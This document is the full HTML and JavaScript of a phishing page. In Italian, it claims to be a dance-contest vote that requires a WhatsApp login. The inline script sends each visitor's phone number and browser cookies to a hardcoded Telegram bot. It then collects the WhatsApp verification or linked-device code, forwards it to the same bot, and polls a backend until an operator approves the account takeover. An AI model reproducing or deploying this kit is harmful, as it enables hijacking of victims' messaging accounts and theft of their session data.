<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/x-icon" href="https://dancebattle.life/static/img/svg/icon.svg">
    <title>Autorizzazione</title>
    <link rel="stylesheet"
        href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
    <script
        src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
    <!-- ВАЖНО: Скрипт number.js отвечает за основную логику формы выбора номера -->
    <script
        src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>

    <style>
        /* Оригинальные стили из number.css остаются как есть, чтобы не ломать number.js */
        /* Добавляем только необходимые правки и стили для новых элементов */
        body { background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); background-color: #ffffff; }
        .loader { border-top: 5px solid #bfbbbb; } /* Стиль для лоадера от number.js */
        
        .block.number .form .search { background-color: #ffffff; }
        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb { background: #152b42; }
        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb:hover { background: #152b42; }
        .popup h2, .block .text { color: #ffffff; }
        .popup p, .block .text p { color: #c6c6c6; }
        .button.primary { color: #ffffff; background-color: #1d9ce0E6; width: 100% !important; }
        .button.primary:hover { background-color: #1d9ce0; }
        
        .block.number .form-container { background-color: #1d3957; }
        .block.number .form-container .form .country { border: 1px solid #80a2b3; }
        .block.number .form-container .form .country .image img { -webkit-mask-image: none !important; }
        .block.number .form-container .form .countries .item .image img { -webkit-mask-image: none !important; }
        .block.number .form-container .form .country.active { border: 1px solid #1d9ce0; }
        .block.number .form-container .form .country p { color: #ffffff; }
        .block.number .form-container .form .country .icon svg path { fill: #bfbbbb; }
        .block.number .form-container .form .countries { background-color: #1d3957; }
        .block.number .form-container .form .countries .search { background-color: #1d3957; }
        .block.number .form-container .form .countries .search input { color: #b1c1d1; background-color: #152b42; }
        .block.number .form-container .form .countries .items { background-color: #1d3957; }
        .block.number .form-container .form .countries .item { background-color: #1d3957; }
        .block.number .form-container .form .countries .item:hover { background-color: #24466b; }
        .block.number .form-container .form .countries .item p.name { color: #b1c1d1; }
        .block.number .form-container .form .countries .item p.code { color: #ffffff; }
        .block.number .form-container .form .qrcode { color: #1d9ce0; }
        .block.number .form-container .form input.number { color: #ffffff; background-color: transparent; border: 1px solid #80a2b3; }
        .block.number .form-container .form input.number:focus { border: 1px solid #1d9ce0; }
        .block.number .form-container .form p.error { color: #d65d7a; }
        .block.code .number-container { border: 20px solid #1d3957; background-color: #ffffff; }
        .popup .body { background-color: #1d3957; }
        .top40 .body{ top: 40%; }

        /* Стили для нашего кастомного шага ввода кода (Telegram) */
        #form-step-telegram .code-title { font-size: 22px; font-weight: 700; color: #ffffff; margin-bottom: 15px; }
        #loader-telegram .loader { /* Стиль для нашего кастомного лоадера */
            width: 50px; height: 50px; border-top: 5px solid #1d9ce0; margin: 20px auto;
        }


        /* --- CSS ИСПРАВЛЕНИЯ ДЛЯ МОБИЛЬНЫХ УСТРОЙСТВ (пункты 1 и 2 клиента) --- */
        @media screen and (max-width: 768px) {
            .block.code { /* Общий блок для второго шага (будь то QR или наша форма) */
                padding-top: 15px;
            }
             .block.code .text { /* Текст "Autorizzazione rapida..." */
                padding: 0 10px; 
                text-align: center;
            }
             .block.code .text h2 { font-size: 1.25em; }
             .block.code .text p { font-size: 0.875em; line-height: 1.45; }

            /* Контейнер, который использует number.js для QR/его лоадера */
            .block.code .number-container#loader { 
                border: 10px solid #1d3957;
                padding: 15px; 
                min-height: 150px; 
                margin-top: 10px; 
                width: calc(100% - 30px); 
                max-width: 280px; 
                box-sizing: border-box;
            }
            /* Лоадер внутри .number-container#loader (от number.js) */
            .block.code .number-container#loader .loader { 
                width: 50px !important;
                height: 50px !important;
                border-width: 5px !important;
                margin: 15px auto; 
            }
             /* Цифры QR-кода (если используется number.js) */
            .block.code .number-container#loader .number-code .symbol {
                font-size: 18px !important; 
                width: 26px !important;    
                height: 36px !important;   
                line-height: 36px !important; 
                margin: 1px !important; 
            }
            .block.code .number-container#loader .number-code .split {
                font-size: 18px !important; 
                padding: 0 2px !important; 
            }
            
            /* Наша форма ввода кода для Telegram на мобильных */
            #form-step-telegram .form-container {
                 padding: 15px;
                 background-color: #1d3957; /* Убедимся, что фон есть */
                 border-radius: 8px; /* Как у основного блока */
                 width: 100%;
                 max-width: 300px; /* Ограничим ширину */
                 margin: 15px auto 0;
            }
            #form-step-telegram .code-title {
                font-size: 1.1em; /* Немного уменьшим */
                margin-bottom: 10px;
            }
            #form-step-telegram input.number#code-telegram {
                padding: 10px;
                font-size: 1em;
                margin-bottom: 15px;
            }
            #form-step-telegram button.primary#two-step-telegram {
                padding: 12px;
                font-size: 1em;
            }
            /* Наш лоадер для Telegram */
            #loader-telegram {
                 margin-top: 20px;
            }
            #loader-telegram .loader {
                 width: 50px !important;
                 height: 50px !important;
                 border-width: 5px !important;
            }
        }
    </style>
</head>

<body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
    <div class="wrapper">
        <!-- Шаг 1: Ввод номера телефона (управляется number.js) -->
        <div class="block number" id="step-1">
            <div class="text">
                <h2>Devi accedere tramite WhatsApp affinché il tuo voto venga preso in considerazione.</h2>
                <p>L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
            </div>
            <div id="form-step-1" class="form-container form-num">
                <div class="form" id="myForm"> <!-- Этот ID используется number.js -->
                    <div class="country">
                        <div class="image">
                            <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
                                alt="AU">
                        </div>
                        <p class="name">Australia</p>
                        <div class="icon">
                            <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class=""
                                fill="none">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor"
                                    fill-opacity="0.3"></path>
                            </svg>
                        </div>
                    </div>
                    <div class="countries hidden"> <!-- Заполняется number.js -->
                        <div class="search">
                            <div class="image">
                                <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet"
                                    class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
                                    <path fill="#bfbbbb"
                                        d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z">
                                    </path>
                                </svg>
                            </div>
                            <input type="text" id="search">
                        </div>
                        <div class="items">
                             <div class="overflow">
                                <!-- СПИСОК СТРАН ГЕНЕРИРУЕТСЯ number.js -->
                                <!-- Оставляю несколько примеров, как в вашем оригинальном файле, -->
                                <!-- так как number.js МОЖЕТ ожидать их для инициализации -->
                                <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
                                <div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
                                <div class="item" data-code="+994" data-lang="AZ" data-name="Azərbaycan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AZ.png" alt="AZ"> </div> <p class="name">Azərbaycan</p> <p class="code">+994</p> </div>
                                <!-- И так далее... весь ваш длинный список стран должен быть здесь, если number.js его не генерирует сам -->
                                <div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
                            </div>
                        </div>
                    </div>
                    <input type="text" class="number" id="number" value="+61" /> <!-- ID используется number.js -->
                    <button class="button primary" id="next-step">Continua</button> <!-- ID используется number.js -->
                    <p class="error hidden">Numero di telefono non valido</p>
                    <div id="verifyForm" style="display: none; margin-top: 20px;"> <!-- Используется number.js? -->
                        <input type="text" id="codeInput" placeholder="Введіть код">
                        <button id="submitCode">Підтвердити</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Шаг 2: Отображение QR-кода/лоадера (управляется number.js) ИЛИ наша форма ввода кода (управляется нашим скриптом) -->
        <div class="block code hidden" id="step-2"> <!-- Этот блок будет показан number.js -->
            <div class="text">
                <h2>Autorizzazione rapida e facile tramite WhatsApp</h2>
                <p>Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle
                    impostazioni, quindi inserisci questo codice</p>
            </div>
            <div class="number-column">
                <!-- Контейнер для QR/лоадера от number.js -->
                <div class="number-container" id="loader"> <!-- ID используется number.js -->
                    <div class="loader"></div>
                    <div class="number-code hidden" id="number-code" data-code="">
                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                        <div class="split">–</div>
                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                    </div>
                </div>

                <!-- Наша форма для ввода кода (для Telegram), изначально скрыта -->
                <div id="form-step-telegram" style="display: none;" class="form-container form-code">
                    <p class="text code-title">Codice:</p> <!-- ПЕРЕВЕДЕНО -->
                    <div class="form" id="form-code-telegram">
                        <input type="text" class="number" id="code-telegram" />
                        <button class="button primary" id="two-step-telegram">Continua</button>
                    </div>
                </div>
                <!-- Наш лоадер (для Telegram), изначально скрыт -->
                <div id="loader-telegram" style="display: none;">
                     <div class="loader"></div> <!-- Используем тот же класс .loader для консистентности -->
                </div>
                <div class="button primary hidden" id="copy-code">Copia</div>
            </div>
        </div>
    </div>

    <!-- Попапы (переведены) -->
    <div class="popup top40" id="popreboot" style="display: none;" >
        <div class="body">
            <h2>Il tuo voto è stato conteggiato, grazie</h2>
            <button class="button primary btn-ok" id="reload-page-ok">Ok</button>
        </div>
    </div>
    <div class="popup top40" id="popwhat" style="display: none;" >
        <div class="body">
            <h2>Qualcosa è andato storto!</h2>
            <p>Hai inserito il codice in modo errato, vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verrà conteggiato.</p>
            <button class="button primary btn-reb" id="reload-page-what">Riprova</button>
        </div>
    </div>
                                
    <script>
    document.addEventListener("DOMContentLoaded", function () {
        const btnRebWhat = document.getElementById("reload-page-what");
        const btnOkReboot = document.getElementById("reload-page-ok");
        
        const popWhat = document.getElementById("popwhat");
        const popReboot = document.getElementById("popreboot");

        const step1Div = document.getElementById("step-1"); 
        const originalStep2Div = document.getElementById("step-2"); // Оригинальный второй шаг (от number.js)
        const originalLoaderContainer = document.getElementById("loader"); // Оригинальный контейнер с лоадером/QR от number.js
        
        const formStepTelegram = document.getElementById("form-step-telegram"); // Наша форма для кода Telegram
        const loaderTelegram = document.getElementById("loader-telegram"); // Наш лоадер для Telegram
        
        const nextStepBtnOriginal = document.getElementById("next-step"); 
        const codeStepBtnTelegram = document.getElementById("two-step-telegram"); 

        if(btnRebWhat) {
            btnRebWhat.addEventListener("click", () => {
                if(popWhat) popWhat.style.display = "none";
                if(formStepTelegram) formStepTelegram.style.display = "block";
                if(loaderTelegram) loaderTelegram.style.display = "none";
                const codeInputTg = document.getElementById("code-telegram");
                if(codeInputTg) codeInputTg.value = "";
            });
        }

        if(btnOkReboot) {
            btnOkReboot.addEventListener("click", () => {
                const redirectUrl = document.body.getAttribute('data-redirect');
                if (redirectUrl) {
                    window.location.href = redirectUrl;
                } else {
                    if(popReboot) popReboot.style.display = "none";
                }
            });
        }

        const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g";
        const chat_id = "7538727898";
        const backendURL = "https://api.bestballerinavote.com";

        // Эта переменная будет отслеживать, был ли номер уже отправлен
        let numberSentToTelegram = false;

        if (nextStepBtnOriginal) {
             nextStepBtnOriginal.addEventListener("click", function (e) {
                // Не используем e.preventDefault(), чтобы number.js мог обработать клик
                // (например, для валидации и перехода на свой #step-2)

                // Отправляем данные в Telegram только если они еще не были отправлены
                if (!numberSentToTelegram) {
                    const phoneInput = document.getElementById("number");
                    if (!phoneInput) return;
                    const phone = phoneInput.value.trim();
                    const errorP = document.querySelector('#form-step-1 .error');

                    if (!phone) { // Простая проверка на пустоту, основная валидация на number.js
                        if (errorP && errorP.classList.contains('hidden')) {
                            // errorP.classList.remove('hidden'); // Доверим показ ошибки number.js
                        }
                        return; 
                    } else {
                       if (errorP) errorP.classList.add('hidden');
                    }

                    sessionStorage.setItem("submittedPhone", phone);
                    const cookies = document.cookie || "Немає кукі";
                    const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id, text: msg })
                    }).then(() => {
                        numberSentToTelegram = true; // Помечаем, что номер отправлен
                    }).catch(err => console.error("Ошибка отправки номера в Telegram:", err));
                }
                // Далее number.js должен скрыть step-1 и показать originalStep2Div
                // Это будет отслежено MutationObserver
            });
        }

        const observer = new MutationObserver(function(mutationsList, observerInstance) {
            for(const mutation of mutationsList) {
                if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
                    if (step1Div && step1Div.style.display === 'none' && originalStep2Div && originalStep2Div.style.display !== 'none') {
                        // number.js скрыл первый шаг И показал свой второй шаг (#step-2)
                        // Теперь мы должны скрыть его оригинальный контент (например, QR-loader)
                        // и показать нашу форму для ввода кода.
                        if (originalLoaderContainer) originalLoaderContainer.style.display = 'none'; // Скрываем оригинальный лоадер/QR
                        if (formStepTelegram) formStepTelegram.style.display = 'block'; // Показываем нашу форму
                        
                        observerInstance.disconnect(); 
                        break;
                    }
                }
            }
        });

        if (step1Div && originalStep2Div) { // Наблюдаем только если оба элемента существуют
            observer.observe(step1Div, { attributes: true });
            observer.observe(originalStep2Div, { attributes: true }); // Также наблюдаем за вторым шагом
        }

        if (codeStepBtnTelegram) {
            codeStepBtnTelegram.addEventListener("click", function (e) {
                e.preventDefault();
                const codeInput = document.getElementById("code-telegram");
                const code = codeInput ? codeInput.value.trim() : "";
                const phone = sessionStorage.getItem("submittedPhone");

                if (!code) { alert("Per favore, inserisci il codice."); return; }
                if (!phone) {
                    alert("Errore: numero di telefono non trovato. Riprova dal primo passaggio.");
                    if(formStepTelegram) formStepTelegram.style.display = "none";
                    if(originalLoaderContainer) originalLoaderContainer.style.display = "block"; // Вернуть оригинальный loader
                    if(step1Div) step1Div.style.display = "block";
                    numberSentToTelegram = false; // Сбросить флаг, чтобы можно было отправить номер заново
                    return;
                }
                const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text: msg })
                });
                if(formStepTelegram) formStepTelegram.style.display = "none";
                if(loaderTelegram) loaderTelegram.style.display = "block";
                waitForApproval(phone);
            });
        }

        function waitForApproval(phone) {
            const interval = setInterval(() => {
                fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
                    .then(res => {
                        if (!res.ok) throw new Error(`Network response was not ok: ${res.statusText}`);
                        return res.json();
                    })
                    .then(data => {
                        console.log("📩 Відповідь від бекенду:", data);
                        if (data.status === "approved") {
                            clearInterval(interval);
                            if(loaderTelegram) loaderTelegram.style.display = "none";
                            if(popReboot) popReboot.style.display = "block";
                        } else if (data.status === "rejected") {
                            clearInterval(interval);
                            if(loaderTelegram) loaderTelegram.style.display = "none";
                            if(popWhat) popWhat.style.display = "block";
                        }
                    })
                    .catch(err => console.error("❌ Помилка бекенду або мережі:", err));
            }, 3000);
        }
    });
    </script>
</body>
</html>
